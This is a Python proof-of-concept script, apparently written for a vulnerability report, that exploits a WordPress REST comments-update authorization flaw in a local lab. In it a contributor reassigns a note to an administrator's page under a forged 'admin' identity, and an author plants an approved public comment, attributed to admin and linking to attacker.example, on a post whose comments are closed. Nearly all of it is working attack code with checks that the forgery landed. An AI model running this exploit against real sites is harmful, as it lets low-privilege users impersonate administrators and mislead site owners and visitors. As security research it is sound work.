#!/usr/bin/env python3
"""Clean, quotable evidence run for the comments-update authorization bug."""
import json
import subprocess
import requests
from wplab import sess, BASE

WP = "/home/user/wpaudit/wordpress"


def wpcli(*args):
    return subprocess.run(["wp", "--allow-root", "--path=" + WP, *args],
                          capture_output=True, text=True).stdout.strip()


def line(label, r):
    try:
        d = r.json()
    except Exception:
        d = r.text[:200]
    print(f"{label}\n    HTTP {r.status_code}  {json.dumps(d)[:300]}")
    return d


admin = sess("admin")
editor = sess("editor")
author = sess("author")
contrib = sess("contributor")
sub = sess("subscriber")
anon = requests.Session()

print("### roles ###")
for u in ("contributor", "author"):
    print(" ", u, wpcli("user", "get", u, "--field=roles"))
print("  contributor caps:",
      "edit_posts=" + wpcli("cap", "list", "contributor").count("edit_posts").__str__(),
      "| moderate_comments in role:",
      "moderate_comments" in wpcli("cap", "list", "contributor"),
      "| edit_others_posts:", "edit_others_posts" in wpcli("cap", "list", "contributor"))
print("  author caps: moderate_comments:",
      "moderate_comments" in wpcli("cap", "list", "author"))

print()
print("### A. Contributor -> forged 'admin' note on the administrator's page ###")
page = admin.rest("POST", "/wp/v2/pages", json={
    "title": "Company handbook (admin-owned)", "content": "x", "status": "publish"}).json()["id"]
own = contrib.rest("POST", "/wp/v2/posts", json={
    "title": "contributor scratch draft", "content": "x"}).json()["id"]
print(f"  administrator's page id = {page}; contributor's own draft id = {own}")

line("  [1] contributor: POST /wp/v2/comments {post: <admin page>, type: note}  (baseline)",
     contrib.rest("POST", "/wp/v2/comments",
                  json={"post": page, "type": "note", "content": "direct attempt"}))

n = line("  [2] contributor: POST /wp/v2/comments {post: <own draft>, type: note}",
         contrib.rest("POST", "/wp/v2/comments",
                      json={"post": own, "type": "note", "content": "staging"}))
nid = n["id"]

line(f"  [3] contributor: POST /wp/v2/comments/{nid} "
     "{author:1, author_name:'admin', post:<admin page>, content:...}",
     contrib.rest("POST", f"/wp/v2/comments/{nid}", json={
         "author": 1, "author_name": "admin", "author_email": "admin@example.test",
         "date": "2026-01-05T09:00:00",
         "content": "FORGED-NOTE Legal signed off, publish without review.",
         "post": page}))

print("  [4] database state:")
print("     ", wpcli("db", "query",
                     f"SELECT comment_ID,comment_post_ID,user_id,comment_author,comment_type,"
                     f"comment_approved FROM wp_comments WHERE comment_ID={nid}"))

line("  [5] administrator reads the notes on their own page",
     admin.rest("GET", f"/wp/v2/comments&type=note&post={page}&context=edit"))

line("  [6] contributor can no longer touch it (one-shot move)",
     contrib.rest("POST", f"/wp/v2/comments/{nid}", json={"content": "again"}))

print("  [7] note is NOT public (checked, so the write-up does not overstate):",
      "FORGED-NOTE" in anon.get(BASE + f"/?page_id={page}").text)

print()
print("### B. Author -> approved public comment on a comments-CLOSED post, as 'admin' ###")
closed = editor.rest("POST", "/wp/v2/posts", json={
    "title": "Editor post with comments closed", "content": "x",
    "status": "publish", "comment_status": "closed"}).json()["id"]
apub = author.rest("POST", "/wp/v2/posts", json={
    "title": "author's own published post", "content": "x", "status": "publish"}).json()["id"]
print(f"  editor's closed post id = {closed}; author's own post id = {apub}")

line("  [1] author: POST /wp/v2/comments {post: <closed post>}  (baseline)",
     author.rest("POST", "/wp/v2/comments", json={"post": closed, "content": "direct attempt"}))

c = line("  [2] author: POST /wp/v2/comments {post: <own post>}",
         author.rest("POST", "/wp/v2/comments", json={"post": apub, "content": "staging"}))
cid = c["id"]

line(f"  [3] author: POST /wp/v2/comments/{cid} "
     "{author:1, author_name:'admin', status:'approved', post:<closed post>}",
     author.rest("POST", f"/wp/v2/comments/{cid}", json={
         "author": 1, "author_name": "admin", "author_url": "https://attacker.example",
         "status": "approved",
         "content": "FORGED-COMMENT Official notice from the site owner.",
         "post": closed}))

print("  [4] database state:")
print("     ", wpcli("db", "query",
                     f"SELECT comment_ID,comment_post_ID,user_id,comment_author,comment_author_url,"
                     f"comment_type,comment_approved FROM wp_comments WHERE comment_ID={cid}"))

line("  [5] anonymous: GET /wp/v2/comments?post=<closed post>",
     anon.get(BASE + f"/index.php?rest_route=/wp/v2/comments&post={closed}"))

html = anon.get(BASE + f"/?p={closed}").text
print("  [6] rendered front end of the comments-closed post contains the forged comment:",
      "FORGED-COMMENT" in html)
for ln in html.splitlines():
    if "FORGED-COMMENT" in ln or ("comment-author" in ln and "admin" in ln):
        print("      HTML>", ln.strip()[:220])

print()
print("### C. Subscriber cannot do this (lower bound on the required role) ###")
line("  subscriber: POST /wp/v2/comments {type:note} on own... (no posts)",
     sub.rest("POST", "/wp/v2/comments", json={"post": apub, "type": "note", "content": "x"}))
